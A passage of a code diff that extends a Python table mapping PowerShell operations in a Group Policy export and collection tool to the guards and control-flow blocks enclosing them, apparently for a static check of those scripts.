+                    "($sysvolErrors -eq 0)]"
+                ),
+            ),
+        ),
+        (
+            "Join-Path $out 'collection-errors.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                (
+                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
+                    "($sysvolErrors -eq 0)]"
+                ),
+            ),
+        ),
+        (
+            'Write-Progress -Activity "Export complete" -Completed',
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            'Write-Host "`nExport summary:`n Succeeded ($($successSections.Count)):"',
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            'Write-Host " - $s"',
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($s in $successSections)",
+            ),
+        ),
+        (
+            'Write-Host " Failed ($($failedSections.Count)):"',
+            (
+                "guard if ($DryRun) -> return",
+                "if ($failedSections.Count -gt 0) after []",
+            ),
+        ),
+        (
+            'Write-Host " - $s"',
+            (
+                "guard if ($DryRun) -> return",
+                "if ($failedSections.Count -gt 0) after []",
+                "foreach ($s in $failedSections)",
+            ),
+        ),
+        (
+            'Write-Host " All sections succeeded."',
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($failedSections.Count -gt 0)]",
+            ),
+        ),
+        (
+            "New-GpoExportZip -ExportPath $out",
+            (
+                "guard if ($DryRun) -> return",
+                "if (-not $NoZip) after []",
             ),
         ),
         (
@@ -2079,30 +3063,282 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             '[System.IO.File]::WriteAllText($testFile, "test")',
             ("try",),
         ),
-        (
-            "New-GpoExportZip -ExportPath $out",
-            (
-                "guard if ($DryRun) -> return",
-                "if (-not $NoZip) after []",
-            ),
-        ),
     ),
     "Export-GroupMembers.ps1": (
         (
+            "Get-Content $PrincipalsPath -Raw -Encoding UTF8",
+            (),
+        ),
+        (
+            "ConvertFrom-Json",
+            (),
+        ),
+        (
+            'Where-Object { $_.Value.type -eq "Group" }',
+            (),
+        ),
+        (
+            'Write-Host "Found $($groups.Count) groups to expand"',
+            (),
+        ),
+        (
+            'Write-Host " Expanding $name ($sid)..."',
+            ("foreach ($grp in $groups)",),
+        ),
+        (
+            "Get-ADGroupMember -Identity $sid -Recursive @adParams -ErrorAction Stop",
+            (
+                "foreach ($grp in $groups)",
+                "try",
+            ),
+        ),
+        (
+            'Write-Host " $($memberSids.Count) members"',
+            (
+                "foreach ($grp in $groups)",
+                "try",
+            ),
+        ),
+        (
+            'Write-Host " FAIL: $($_.Exception.Message)"',
+            (
+                "foreach ($grp in $groups)",
+                "catch []",
+            ),
+        ),
+        (
+            'Get-Date -Format "o"',
+            (),
+        ),
+        (
+            "ConvertTo-Json -Depth 5",
+            (),
+        ),
+        (
             "Set-Content $OutputPath -Encoding UTF8",
+            (),
+        ),
+        (
+            'Write-Host "Done: $expanded expanded, $failed failed -> $OutputPath"',
             (),
         ),
     ),
     "Export-Principals.ps1": (
         (
+            "Test-Path $SddlSource",
+            ("if-condition after []",),
+        ),
+        (
+            'Write-Host "Reading SDDL from: $SddlSource"',
+            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
+        ),
+        (
+            'Join-Path $SddlSource "AllGPOs.xml"',
+            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
+        ),
+        (
+            "Test-Path $allXml",
+            (
+                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
+                "if-condition after []",
+            ),
+        ),
+        (
+            'Join-Path $SddlSource "reports"',
+            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
+        ),
+        (
+            "Test-Path $reportsDir",
+            (
+                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
+                "if-condition after []",
+            ),
+        ),
+        (
+            'Get-ChildItem $reportsDir -Filter "*.xml" -ErrorAction SilentlyContinue',
+            (
+                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
+                "if (Test-Path $reportsDir) after []",
+            ),
+        ),
+        (
+            "Get-Content $f -Raw -ErrorAction Stop",
+            (
+                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
+                "foreach ($f in $xmlFiles)",
+                "try",
+            ),
+        ),
+        (
+            'Join-Path $SddlSource "gpo-metadata.json"',
+            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
+        ),
+        (
+            "Test-Path $metaFile",
+            (
+                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "Get-Content $metaFile -Raw",
+            (
+                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
+                "if (Test-Path $metaFile) after []",
+                "try",
+            ),
+        ),
+        (
+            'Write-Host "Collecting SDDL from live AD via Get-ADObject..."',
+            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
+        ),
+        (
+            "Get-ADDomain @adParams",
+            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
+        ),
+        (
+            (
+                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
+                '"(objectClass=groupPolicyContainer)" -Properties nTSecurityDescriptor, '
+                "displayName @adParams"
+            ),
+            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
+        ),
+        (
+            'Write-Host "Found $($allSids.Count) unique SIDs to resolve"',
+            (),
+        ),
+        (
+            "Sort-Object",
+            ("foreach ($sid in $allSids | Sort-Object)",),
+        ),
+        (
+            "New-Object System.Security.Principal.SecurityIdentifier($sid)",
+            (
+                "foreach ($sid in $allSids | Sort-Object)",
+                "try",
+            ),
+        ),
+        (
+            'Write-Host " $sid -> $translated"',
+            (
+                "foreach ($sid in $allSids | Sort-Object)",
+                "try",
+            ),
+        ),
+        (
+            'Write-Host " $sid -> (unresolved)"',
+            (
+                "foreach ($sid in $allSids | Sort-Object)",
+                "catch []",
+            ),
+        ),
+        (
+            "Where-Object { $_ -match '^S-1-5-21-' -and $principals[$_].type -eq 'Unresolved' }",
+            (),
+        ),
+        (
+            'Write-Host "Resolving $($domainSids.Count) domain SIDs via Get-ADObject..."',
+            ("if ($domainSids.Count -gt 0) after []",),
+        ),
+        (
+            "Get-ADDomain @adParams",
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "if (-not $dom) after []",
+                "try",
+            ),
+        ),
+        (
+            (
+                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties objectClass, "
+                "sAMAccountName, name @adParams -ErrorAction Stop"
+            ),
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
+                "try",
+            ),
+        ),
+        (
+            'Write-Host " AD: $sid -> $sam ($ptype)"',
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
+                "try",
+                "if ($obj) after []",
+            ),
+        ),
+        (
+            'Write-Host " AD resolve failed for $sid : $($_.Exception.Message)"',
+            (
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
+                "catch []",
+            ),
+        ),
+        (
+            'Get-Date -Format "o"',
+            (),
+        ),
+        (
+            "ConvertTo-Json -Depth 5",
+            (),
+        ),
+        (
             "Set-Content $OutputPath -Encoding UTF8",
+            (),
+        ),
+        (
+            'Write-Host "Done: $resolved resolved, $unresolved unresolved -> $OutputPath"',
             (),
         ),
     ),
     "Run-GpoLensCollection.ps1": (
         (
+            "Join-Path $PSScriptRoot 'Export-GpoEstate.ps1'",
+            (),
+        ),
+        (
             ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
             (),
+        ),
+        (
+            "Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1'",
+            (),
+        ),
+        (
+            "Get-Date -Format o",
+            ("function Write-GpoLensCollectionLog",),
+        ),
+        (
+            "Test-Path -LiteralPath $LogPath",
+            (
+                "function Write-GpoLensCollectionLog",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "Get-Item -LiteralPath $LogPath",
+            (
+                "function Write-GpoLensCollectionLog",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "Test-Path -LiteralPath $next",
+            (
+                "function Write-GpoLensCollectionLog",
+                (
+                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
+                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
+                ),
+                "for ($i = $LogFiles; $i -ge 1; $i--)",
+                "if-condition after []",
+            ),
         ),
         (
             "Remove-Item -LiteralPath $next -Force -ErrorAction Stop",
@@ -2114,6 +3350,18 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 ),
                 "for ($i = $LogFiles; $i -ge 1; $i--)",
                 "if (Test-Path -LiteralPath $next) after []",
+            ),
+        ),
+        (
+            "Test-Path -LiteralPath $old",
+            (
+                "function Write-GpoLensCollectionLog",
+                (
+                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
+                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
+                ),
+                "for ($i = $LogFiles; $i -ge 1; $i--)",
+                "if-condition after []",
             ),
         ),
         (
@@ -2129,6 +3377,238 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Add-Type -AssemblyName System.IO.Compression.FileSystem",
+            ("function Get-GpoLensCompletedExports",),
+        ),
+        (
+            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' -ErrorAction Stop",
+            ("function Get-GpoLensCompletedExports",),
+        ),
+        (
+            (
+                "Where-Object { $_.BaseName -match '^.+-\\d{8}-\\d{6}$' -and (Test-Path "
+                "-LiteralPath (Join-Path (Join-Path $OutputRoot $_.BaseName) 'AllGPOs.xml') "
+                "-PathType Leaf) }"
+            ),
+            ("function Get-GpoLensCompletedExports",),
+        ),
+        (
+            (
+                "Test-Path -LiteralPath (Join-Path (Join-Path $OutputRoot $_.BaseName) "
+                "'AllGPOs.xml') -PathType Leaf"
+            ),
+            (
+                "function Get-GpoLensCompletedExports",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            "Join-Path (Join-Path $OutputRoot $_.BaseName) 'AllGPOs.xml'",
+            (
+                "function Get-GpoLensCompletedExports",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            "Join-Path $OutputRoot $_.BaseName",
+            (
+                "function Get-GpoLensCompletedExports",
+                "scriptblock positional of Where-Object",
+            ),
+        ),
+        (
+            (
+                "Sort-Object @{ Expression = { $_.BaseName.Substring($_.BaseName.Length - 15) "
+                "}; Descending = $true }, Name"
+            ),
+            ("function Get-GpoLensCompletedExports",),
+        ),
+        (
+            'Write-Warning "Skipping incomplete ZIP (no estate report): $($archive.Name)"',
+            (
+                "function Get-GpoLensCompletedExports",
+                "foreach ($archive in $candidates)",
+                "try",
+                "else of [($zip.GetEntry('AllGPOs.xml'))]",
+            ),
+        ),
+        (
+            'Write-Warning "Skipping unreadable/incomplete ZIP: $($archive.Name)"',
+            (
+                "function Get-GpoLensCompletedExports",
+                "foreach ($archive in $candidates)",
+                "catch []",
+            ),
+        ),
+        (
+            "Get-Item -LiteralPath $directory -Force",
+            (
+                "function Assert-GpoLensRegularTree",
+                "While ($pending.Count -gt 0)",
+            ),
+        ),
+        (
+            "Get-ChildItem -LiteralPath $directory -Force",
+            (
+                "function Assert-GpoLensRegularTree",
+                "While ($pending.Count -gt 0)",
+                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
+                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
+            ),
+        ),
+        (
+            "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
+            ("function Assert-GpoLensCollectionOwner",),
+        ),
+        (
+            "Test-Path -LiteralPath $marker -PathType Leaf",
+            (
+                "function Assert-GpoLensCollectionOwner",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
+            (
+                "function Assert-GpoLensCollectionOwner",
+                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
+            ),
+        ),
+        (
+            "Test-Path -LiteralPath $OutputRoot",
+            (
+                "function Invoke-GpoLensCollection",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "Get-Item -LiteralPath $OutputRoot -Force",
+            (
+                "function Invoke-GpoLensCollection",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "Join-Path $OutputRoot 'collection.lock'",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "Join-Path $OutputRoot 'collection.log'",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+            ),
+        ),
+        (
+            "Write-GpoLensCollectionLog @logArgs -Message 'Collection started'",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "Resolve-Path -LiteralPath $InventoryPath",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "if ($InventoryPath) after []",
+            ),
+        ),
+        (
+            "ConvertFrom-Json",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "if ($InventoryPath) after []",
+            ),
+        ),
+        (
+            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip'",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "ForEach-Object { $previous[$_.FullName] = $true }",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
             "& $CollectorPath -OutputRoot $OutputRoot *>&1",
             (
                 "function Invoke-GpoLensCollection",
@@ -2140,6 +3620,129 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                 "try",
                 "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            (
+                "ForEach-Object { Write-GpoLensCollectionLog @logArgs -Message ($_ | "
+                "Out-String).TrimEnd() }"
+            ),
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "Write-GpoLensCollectionLog @logArgs -Message ($_ | Out-String).TrimEnd()",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "scriptblock positional of ForEach-Object",
+            ),
+        ),
+        (
+            "Out-String",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "scriptblock positional of ForEach-Object",
+            ),
+        ),
+        (
+            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "Where-Object { -not $previous.ContainsKey($_.FullName) }",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "Join-Path $OutputRoot $newest.BaseName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+            ),
+        ),
+        (
+            "Add-Type -AssemblyName System.IO.Compression.FileSystem",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+            ),
+        ),
+        (
+            "Join-Path $exportDir 'gpo-inventory.json'",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "try",
+                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
+                "if ($InventoryPath) after []",
             ),
         ),
         (
@@ -2160,6 +3763,38 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
         ),
         (
             "New-Item -ItemType Directory -Path $CopyTo -Force",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "if ($CopyTo) after []",
+            ),
+        ),
+        (
+            "Out-Null",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "if ($CopyTo) after []",
+            ),
+        ),
+        (
+            "Join-Path $CopyTo $newest.Name",
             (
                 "function Invoke-GpoLensCollection",
                 (
@@ -2209,6 +3844,24 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Test-Path -LiteralPath $partial",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "if ($CopyTo) after []",
+                "finally",
+                "if-condition after []",
+            ),
+        ),
+        (
             "Remove-Item -LiteralPath $partial -Force",
             (
                 "function Invoke-GpoLensCollection",
@@ -2224,6 +3877,122 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 "if ($CopyTo) after []",
                 "finally",
                 "if (Test-Path -LiteralPath $partial) after []",
+            ),
+        ),
+        (
+            'Write-GpoLensCollectionLog @logArgs -Message "ZIP delivered: $delivery"',
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "if ($CopyTo) after []",
+            ),
+        ),
+        (
+            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+            ),
+        ),
+        (
+            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            (
+                "Where-Object { [string]::Equals($_.BaseName.Substring(0, $_.BaseName.Length - "
+                "16), $producerPrefix, [StringComparison]::Ordinal) }"
+            ),
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "Select-Object -Skip $Retention",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "Join-Path $OutputRoot $archive.BaseName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "foreach ($archive in $expired)",
+            ),
+        ),
+        (
+            "Assert-GpoLensRegularTree -Root $folder",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "foreach ($archive in $expired)",
             ),
         ),
         (
